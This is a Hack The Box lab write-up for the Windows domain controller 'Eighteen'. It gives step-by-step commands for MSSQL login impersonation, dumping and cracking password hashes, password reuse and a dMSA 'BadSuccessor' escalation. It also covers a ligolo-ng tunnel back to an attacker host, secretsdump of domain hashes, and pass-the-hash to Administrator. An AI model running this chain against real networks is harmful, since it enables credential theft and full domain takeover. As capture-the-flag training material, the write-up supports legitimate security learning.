# HTB: Eighteen

**Target IP:** 10.10.11.95
**Difficulty:** *(add rating)*
**OS:** Windows (Active Directory / Domain Controller)
**Provided Credentials:** `kevin:iNa2we0haRj2gaw!`

---

## 1. Reconnaissance

### Nmap
```bash
nmap -sS -sV -Pn -O -A -oN nmap/initial-scan.txt 10.10.11.95
```

**Open ports:**
| Port | Service | Version |
|---|---|---|
| 80 | http | Microsoft IIS httpd 10.0 |
| 1433 | ms-sql-s | SQL Server 2022 16.00.1000 |
| 5985 | http | Microsoft HTTPAPI httpd 2.0 (WinRM) |

Also ran a full-range RustScan and a targeted deep scan for confirmation:
```bash
rustscan -a $targetIp --ulimit 2000 -r 1-65535 -- -A sS -Pn
nmap -p 80,135,139,445,1433,5985 -sC -sV -oN /home/matthewh/eighteen/deep-scan.txt
```

Results were consistent across all scans.

### Vulnerability research
Cross-referenced discovered services against known CVEs:

| Service | Port | CVE | Description | Severity |
|---|---|---|---|---|
| Microsoft IIS 10.0 | 80 | CVE-2023-36434 | Elevation of Privilege | Critical |
| MS-SQL-S | 1433 | CVE-2023-21173 | Remote Code Execution | High |
| MS-SQL-S | 1433 | CVE-2023-21705 | Remote Code Execution | High |
| MS-SQL-S | 1433 | CVE-2023-36728 | Denial of Service | — |
| Microsoft HTTPAPI | 5985 | CVE-2024-42179 | Sensitive Info Disclosure | Low |
| Microsoft HTTPAPI | 5985 | CVE-2023-44487 | HTTP/2 Rapid Reset DoS | High |

None of these ended up being the actual path in — the real chain was credential-driven, not a direct exploit against these CVEs.

### Virtual hosting
The web root didn't render on the raw IP; Nmap's redirect indicated a vhost (`eighteen.htb`). Added the domain and DC hostname to `/etc/hosts`:

```bash
echo '10.10.11.95 eighteen.htb' | sudo tee -a /etc/hosts
echo '10.10.11.95 DC01.eighteen.htb' | sudo tee -a /etc/hosts
```

### Key findings from recon
- Port 1433 leaked substantial Active Directory metadata via Nmap's SQL scripts, confirming this box is a **domain controller**, not just a member server hosting SQL — unusual for an "Easy"-rated box, but a strong hint that MSSQL is the intended entry point.
  - **Domain:** `EIGHTEEN`
  - **Hostname:** `DC01`
  - **FQDN:** `DC01.eighteen.htb`
- SQL Server authentication uses NTLM with a self-signed SSL fallback certificate — typical of a default SQL Server install.
- Port 5985 confirms WinRM is enabled, which becomes the eventual shell delivery mechanism once valid credentials are in hand.

---

## 2. Initial Access — MSSQL Enumeration & Impersonation

Used **Impacket's `mssqlclient`** to authenticate with the provided credentials:

```bash
impacket-mssqlclient kevin:'iNa2we0haRj2gaw!'@10.10.11.95
```

### Login impersonation
```sql
enum_impersonate
```

Result: `kevin` holds `IMPERSONATE` rights on the `appdev` login. On a domain controller, this kind of misconfiguration is a direct path to further access.

```sql
EXECUTE AS LOGIN = 'appdev';
```

### Database enumeration
```sql
SELECT name FROM sys.databases;
```

A `financial_planner` database stood out from the defaults.

```sql
USE financial_planner;
SELECT name FROM financial_planner.sys.tables;
```

A `users` table was present. Inspected its schema:

```sql
SELECT COLUMN_NAME, DATA_TYPE
FROM financial_planner.INFORMATION_SCHEMA.COLUMNS
WHERE TABLE_NAME = 'users';
```

Columns included full name, email, username, password hash, and an admin flag.

### Dumping credentials
```sql
SELECT username, email, password_hash FROM financial_planner.dbo.users;
```

Retrieved an `admin` account (`admin@eighteen.htb`) with a **PBKDF2-SHA256** hash — not crackable out-of-the-box with Hashcat's default modes. After some research, used a custom Python cracking script (`hash-cracker.py`) built around a known PBKDF2-SHA256 cracking approach found during research, against a wordlist (`hash.txt`):

```bash
python3 hash-cracker.py
```

**Cracked:** `iloveyou1`

---

## 3. Password Reuse → Foothold

With the admin password cracked, checked for reuse across other domain accounts. Enumeration (NetExec, and cross-referencing a public walkthrough after tooling issues) identified that **`adam.scott`** reused the same password, and that WinRM authentication succeeded for that account ("Pwn3d!").

```bash
evil-winrm -u adam.scott -p 'iloveyou1' -i 10.10.11.95
```

This landed a PowerShell session on the DC and the **user flag**.

---

## 4. Privilege Escalation — dMSA / "BadSuccessor" Abuse (Windows Server 2025)

Enumeration pointed toward this being a **Windows Server 2025** domain controller, based on tooling behavior and the relevance of delegated Managed Service Account (dMSA) attack tooling (SharpSuccessor / Rubeus / PowerView.py). This lines up with the **BadSuccessor** technique — an abuse of the new dMSA feature in Windows Server 2025 that allows a principal with `CREATE_CHILD` rights on an OU to create a dMSA that supersedes a privileged account (e.g., `Administrator`), and then request that account's credentials via Kerberos.

### Confirming the misconfiguration
`adam.scott` belongs to the **Staff** OU and holds `CREATE_CHILD` rights on it:

```powershell
Get-DomainObjectAcl -Identity "OU=Staff,DC=eighteen,DC=htb" -Where "ActiveDirectoryRights contains CreateChild"
```

### Tooling path
Two tool paths were attempted for the dMSA abuse chain:

**Attempt 1 — SharpSuccessor + Rubeus (.exe, from the target host):**
Uploaded both binaries to the target via `Invoke-WebRequest` against a Python HTTP server:
```powershell
Invoke-WebRequest -Uri http://10.10.17.88:8080/SharpSuccessor.exe -OutFile C:\Users\adam.scott\Temp\SharpSuccessor.exe
```

```powershell
.\SharpSuccessor.exe add /impersonate:Administrator /path:"ou=Staff,dc=eighteen,dc=htb" /account:adam.scott /name:attacker_dMSA
```
This succeeded in creating the dMSA. However, ticket requests via Rubeus repeatedly failed (`KDC_ERR_ETYPE_NOTSUPP`, later `Access is Denied` / `LsaLookupAuthenticationPackage` errors) despite trying RC4 and AES256 ticket requests and PTT injection. This path was eventually abandoned in favor of a Linux-side tool chain, driven through a network pivot instead of running everything on-host.

**Attempt 2 (successful) — ligolo-ng pivot + PowerView.py + Impacket:**

1. Set up a **ligolo-ng** tunnel to route traffic from the attack box directly into the internal network, avoiding the need to push every tool to the target:
   ```bash
   # Attacker
   sudo ip tuntap add user matt mode tun ligolo
   sudo ip link set ligolo up
   ./proxy -selfcert -laddr 10.10.17.88:11601
   ```
   ```powershell
   # Target
   .\agent.exe -connect 10.10.17.88:11601 -ignore-cert
   ```
   ```bash
   # Attacker - route + start session
   sudo ip route add 10.10.11.95/32 dev ligolo
   ```
   Also routed the internal WebUI-tunneled address:
   ```bash
   sudo ip route add 240.0.0.1/32 dev ligolo
   ```
   (The `240.0.0.1` address is an alternate ligolo-ng WebUI tunnel range used to route around firewall restrictions without pushing tooling to the target.)

2. Installed **PowerView.py** and authenticated through the tunnel:
   ```bash
   pipx install powerview.py
   powerview eighteen.htb/adam.scott:iloveyou1@240.0.0.1
   ```

3. Created the malicious dMSA via PowerView.py:
   ```powershell
   Add-DomainDMSA -Identity attacker_dmsa `
     -PrincipalAllowedToRetrieveManagedPassword adam.scott `
     -Superseded Administrator `
     -BaseDN 'OU=Staff,DC=eighteen,DC=htb'
   ```
   Confirmed with:
   ```powershell
   Get-DomainDMSA
   ```

4. Requested a TGT for `adam.scott` (Impacket):
   ```bash
   python3 getTGT.py eighteen.htb/adam.scott:iloveyou1 -dc-ip 240.0.0.1
   export KRB5CCNAME=adam.scott.ccache
   ```

5. Requested a service ticket impersonating the new dMSA:
   ```bash
   python3 getST.py eighteen.htb/adam.scott -impersonate 'attacker_dmsa' -self -dmsa -dc-ip 240.0.0.1 -k -no-pass
   ```
   This generates a ticket for the dMSA (which now supersedes `Administrator`), saved as something like `attacker_dmsa$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache`.
   ```bash
   export KRB5CCNAME=attacker_dmsa\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
   ```

6. Dumped domain secrets using the impersonated dMSA ticket:
   ```bash
   python3 secretsdump.py eighteen.htb/attacker_dmsa\$@dc01.eighteen.htb -dc-ip 240.0.0.1 -target-ip 240.0.0.1 -k -no-pass
   ```
   This returned NTLM hashes, including one for `Administrator`.

   > **Gotcha:** `secretsdump` returns two hash entries associated with the recovered credential material — the first one is *not* the usable Administrator hash. The correct value is the second hash (after the colon in the output). Using the first caused repeated authentication failures/kicks in Evil-WinRM before this was identified.

### Getting root
```bash
evil-winrm -i 240.0.0.1 -u administrator -H <correct_ntlm_hash>
```

Authenticated as `Administrator`.

```powershell
cd \Users\Administrator\Desktop
```

**Root flag captured.** ✅

---

## Summary of Attack Chain

1. Recon identifies IIS (80), MSSQL (1433), and WinRM (5985) on what turns out to be the domain controller (`DC01.eighteen.htb`)
2. Authenticate to MSSQL as `kevin` via Impacket, discover `IMPERSONATE` rights on `appdev`
3. Impersonate `appdev` → find `financial_planner` DB → dump `users` table
4. Crack the admin's PBKDF2-SHA256 hash (`iloveyou1`) with a custom script
5. Password reuse: `adam.scott` shares the cracked password → WinRM foothold → user flag
6. Identify Windows Server 2025 dMSA ("BadSuccessor") misconfiguration: `adam.scott` has `CREATE_CHILD` on the Staff OU
7. Pivot into the internal network with **ligolo-ng**, use **PowerView.py** to create a dMSA superseding `Administrator`
8. Abuse Kerberos S4U2self (Impacket `getTGT`/`getST`) to obtain a ticket for the impersonated dMSA
9. `secretsdump` with the dMSA ticket dumps the `Administrator` NTLM hash
10. Pass-the-hash with Evil-WinRM → root flag

## Challenges & Lessons Learned
- **Tooling choice matters more than raw capability.** SharpSuccessor/Rubeus run entirely on-host and hit repeated ticket/encryption-type errors (`KDC_ERR_ETYPE_NOTSUPP`, session/PTT failures) that were never fully resolved. Switching to a Linux-side chain (PowerView.py + Impacket) through a **ligolo-ng** tunnel was more reliable and easier to debug.
- **Kerberos tickets are time-sensitive.** Working slowly across steps caused TGTs to expire mid-chain, forcing full restarts of the ticket-request sequence. Time sync between attacker and DC mattered.
- **Machine resets are disruptive on AD boxes.** Uploaded agents/binaries (`agent.exe`, dMSA objects) had to be re-created multiple times after resets.
- **Read tool output carefully.** The `secretsdump` gotcha (using the wrong of two returned hashes) cost significant time and repeated Evil-WinRM disconnects before being caught.
- **BadSuccessor (dMSA abuse) is a Windows Server 2025-specific privilege escalation path.** Any OU-level `CREATE_CHILD` right combined with dMSA support is worth checking for on newer domain controllers — it's a fast route to full domain compromise if present.
